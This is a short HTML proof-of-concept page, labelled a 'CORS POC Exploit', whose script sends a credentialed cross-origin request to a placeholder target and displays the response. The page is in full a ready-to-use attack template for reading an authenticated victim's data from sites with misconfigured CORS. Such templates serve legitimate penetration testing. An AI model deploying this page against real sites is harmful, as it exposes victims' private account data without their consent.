<html>
<head>
    <title>CORS POC Exploit</title>
</head>
<body>
    <center>
    <h2>CORS POC Exploit</h2>
    <h3>created by Yusufa</h3>
    <button onclick="exploitCORS()">Fetch from the target!</button>
    <hr size=1 width="88%">
    <textarea id="fetchedResource" rows="10" cols="50" style="width:75%" placeholder="Response will appear here..."></textarea>
    </center>

<script>
function exploitCORS(){
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get', 'https://yoursitehere/', true);
    req.withCredentials = true;
    req.send();
}

function reqListener(){
    document.getElementById("fetchedResource").value = this.responseText;
}
</script>
</body>
</html>
